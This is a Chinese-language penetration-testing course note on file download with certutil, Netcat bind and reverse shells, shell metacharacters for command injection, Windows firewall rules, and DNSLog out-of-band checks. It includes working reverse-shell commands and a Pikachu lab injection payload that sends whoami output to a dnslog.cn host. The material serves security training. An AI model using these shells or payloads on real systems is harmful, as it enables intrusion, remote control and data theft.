Day05 基础入门-反弹SHELL&不回显带外&正反向连接&防火墙出入站&文件下载
=
案例
-
1.	文件上传下载-解决无图形化&解决数据传输
2.	反弹Shell命令-解决数据回显&解决数据通讯
3.	防火墙绕过-正向连接&反向连接&内网服务器
4.	防火墙组合数据不回显-ICMP带外查询dnslog

#常规基本渗透命令详解
-
常用命令  
<https://blog.csdn.net/weixin_43303273/article/details/83029138>  

#实用案例1:文件上传下载-解决无图形化&解决数据传输  
命令生成:  
<https://forum.ywhack.com/bountytips.php?download>  
Linux : wget curl python rubyperl java等  
Windows : PowerShell Certutil Bitsadmin msiexec mshta rundll32等

Certutil本质是一个管理证书、证书服务和密钥存储的工具，不过黑客们被玩坏了，可以用这个来下载文件。
certutil.exe -urlcache -split -f <http://example.com/file.txt> file.txt

#实用案例2:反弹shell命令-解决数据回显&解决数据通讯命令生成:  
<https://forum.ywhack.com/shell.php>  

# Netcat

### 介绍
（简称nc）一款功能强大的网络工具，在网络管理、渗透测试以及安全评估等领域有着广泛应用，常被称为 “网络瑞士军刀”。  
Netcat 可以用于远程执行命令。  
### 下载
可在此处下载Windows版本的Netcat  
<https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip>

1、正向连接 本地监听，等待对方连接  
-
Linux控制Windows  
>Windows绑定CMD到本地5566端口
>```cmd
>ncat -e cmd -lvp 5566
>```
>Linux主动连接目标
>```bash
>ncat ip 5566
>```
Windows控制Linux  
>绑定sh到本地5566端口
>```bash
>ncat -e /bin/sh-lvp 5566  
>```
>主动连接目标 
>```cmd
>nc ip 5566  
>```

2、反向连接 主动给出去，对方监听  
-
Linux主动给出  
>Linux绑定sh到目标5566端口  
>```bash
>ncat -e /bin/sh 接收者IP 5566
>```  
>Windows监听5566连接  
>```cmd
>nc -lvvp 5566  
>```

Windows主动给出  
>Windows绑定CMD到目标5566端口   
>```cmd
>ncat -e cmd 接收者IP 5566  
>```
>Linux监听5566连接  
>```bash
>nc -lvvp 5566  
>```

***受制于万恶的NAT， 内网的机器只能主动找其他主机.***

特殊符号
-
    Linux	            可用    |	||	&	&&	 ；	``
    Windows-cmd	        可用	|	||	&	&&        不可用 ；	``
    Windows-powershell	可用	|	||	&	&&   ；   不可用 ``

### 1.	| （管道符号）
例如，使用管道可以将文件内容通过`cat`命令输出，并通过`grep`命令进行筛选：
cat file.txt | grep "keyword"
https://blog.csdn.net/zhangkunls/article/details/143167921
### 2.	||（逻辑或）
command1 || command2
如果 command1 执行失败（返回一个非零状态码），则 command2 会被执行。如果 command1 执行成功（返回零状态码），则 command2 不会被执行。
### 3.	&&（逻辑与）
https://blog.csdn.net/dessler/article/details/142343304
### 4.	&（后台任务）
在Linux中，当你在命令的末尾添加“&”时，该命令会在后台运行，这样你就可以继续在同一个终端上进行其他操作，而不会因为该命令的执行而被阻塞。
### 5.	；
Linux系统中的分号（;）用于在命令行中分隔多个命令，使得这些命令可以顺序执行。
### 6.	``
``中的内容执行后替换

实战
-
Windows Server 部署Pikachu漏洞练习平台，打开RCE-exec“ping”  
1、	下载源码  
2、	添加网站并上传源码  
3、	找到Pikachu漏洞练习平台中的RCE-exec“ping”  
4、	利用符号进行漏洞利用  

防火墙的出站和入站限制
-
<i>Windows 防火墙是 Windows 用于监控和控制进出计算机的网络流量的安全工具。通过配置防火墙策略，可以有效保护系统免受网络攻击和未经授权的访问。</i>

### Windows 防火墙的基本功能
    入站规则：控制外部网络对计算机的访问。
    出站规则：控制计算机访问外部网络的行为。
    网络类型配置：根据网络环境（公共、专用、域）设置不同的防火墙规则。
    应用程序控制：允许或阻止特定应用程序的网络访问。

### 配置防火墙策略的方法
#### 使用图形界面（GUI）
1.	打开 控制面板 > 系统和安全 > Windows Defender 防火墙。
2.	在左侧菜单中，选择 高级设置，进入 高级安全 Windows Defender 防火墙。
3.	在这里可以配置
     入站规则：管理外部访问本机的规则。  
     出站规则：管理本机访问外部的规则。  
     连接安全规则：配置 IPsec 规则，用于加密网络通信。  
     监视：查看当前生效的规则和连接。  
#### 使用命令行工具（netsh） 
通过 netsh 命令可以快速配置防火墙策略。  
查看当前防火墙配置   
```cmd
netsh advfirewall show allprofiles  
```
启用或禁用防火墙  
```cmd
netsh advfirewall set allprofiles state on  
netsh advfirewall set allprofiles state off  
```
添加入站规则  
```
netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80  
```
#### 使用 PowerShell
PowerShell 提供了更强大的管理功能。例如：
查看所有防火墙规则：
```powershell
Get-NetFirewallRule
```
创建新的入站规则：
```powershell
New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
```

#### Windows对于防火墙的策略
1.	默认阻止所有入站流量：除非明确允许，否则阻止所有外部访问。
2.	允许必要的出站流量：限制出站流量，防止恶意软件外传数据。
3.	按网络类型配置：
>公共网络：使用最严格的规则。  
专用网络：适当放宽规则，方便内部通信。  
域网络：根据域策略配置。

4. 常见防火墙策略示例
允许特定端口的入站流量：
允许 HTTP（端口 80）和 HTTPS（端口 443）流量：
```cmd
netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="Allow HTTPS" dir=in action=allow protocol=TCP localport=443
```
阻止特定 IP 地址的访问：
```cmd
netsh advfirewall firewall add rule name="Block IP" dir=in action=block remoteip=192.168.1.100
```
允许特定应用程序的出站流量：
```powershell
New-NetFirewallRule -DisplayName "Allow Chrome" -Direction Outbound -Program "C:\Program Files\Google\Chrome\Application\chrome.exe" -Action Allow
```


存在漏洞，但是数据不回显：  
1、	反弹shell  
2、	带外查询  

DnsLog
-
<http://www.dnslog.cn/>是一个提供 DNSLog 服务的网站。  
DNSLog 是一种利用 DNS 协议记录相关信息来进行安全测试、漏洞挖掘等的技术手段。在安全测试场景中：  
当测试人员想要探测目标系统是否存在某些漏洞（如命令执行漏洞）时，若在目标系统中执行的命令能够触发向特定域名发起 DNS 查询请求，通过在 “dnslog.cn” 这类平台上点击”Get SubDomain”创建唯一标识的域名，就可以通过查看该平台上的 DNS 查询记录，确认目标系统是否执行了特定命令，以此来判断漏洞是否存在。  

Windows的cmd不能使用``，所以我们可以用powershell来定义变量：  
输出当前用户
```powershell
$a=whoami  
echo $a  
```
输出当前用户和ip配置
```powershell
$x=whoami;$y=ipconfig  
$x+$y  
```
作用是把$x中的\替换成x，并赋值给$xx变量  
```powershell
$xx=$x.replace('\','x');  
```
上面的语句中分号是作为每条命令的结束，这些功能是cmd所不具备的。  


当数据不能回显时  
看一下是否能正确执行命令  
在pikachu漏洞练习平台模拟让服务器向dnslog.cn发起请求  
Rce-ping构造恶意语句  
```powershell
127.0.0.1 | powershell.exe $a=whoami;$aa=$a.replace('\','x');$bb='.dbwph8.dnslog.cn';$c=$aa+$bb;ping $c;  
```
这时候刷新，dnslog就会出现记录  
